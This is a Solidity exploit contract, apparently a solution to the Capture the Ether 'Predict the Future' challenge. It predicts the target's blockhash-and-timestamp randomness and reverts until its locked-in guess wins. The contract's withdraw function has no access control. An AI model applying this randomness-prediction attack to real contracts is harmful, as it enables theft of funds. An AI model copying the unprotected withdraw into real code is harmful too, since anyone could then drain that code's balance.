/**
 *Submitted for verification at Etherscan.io on 2021-10-07
*/

pragma solidity ^0.8.7;
 
interface PredictTheFutureChallenge {
    
    function settle() external;
    
    function lockInGuess(uint8 n) external payable;
}

contract PredictTheFutureChallengeCaller {
    
    address contractAddress = 0x3F53c9CA6694becEF738Cd465dC0CE258d451FCf;
    PredictTheFutureChallenge predictTheFutureChallenge = PredictTheFutureChallenge(contractAddress);
    
    event Missed(uint8 answer);
    event Bingo();
    
    function lockInGuess() public payable {
        
        predictTheFutureChallenge.lockInGuess{value: 1 ether}(1);
    }
    
    function settle() public {
        
        uint answer256 = uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
        uint8 answer8 = uint8(answer256);
        answer8 = answer8 % 10;
        
        if (answer8 == 1) {
            emit Bingo();
        } else {
            emit Missed(answer8);
        }
        
        require(answer8 == 1);
        predictTheFutureChallenge.settle();
    }
    
    function withdraw(address payable _to) public {
        _to.transfer(address(this).balance);
    }
}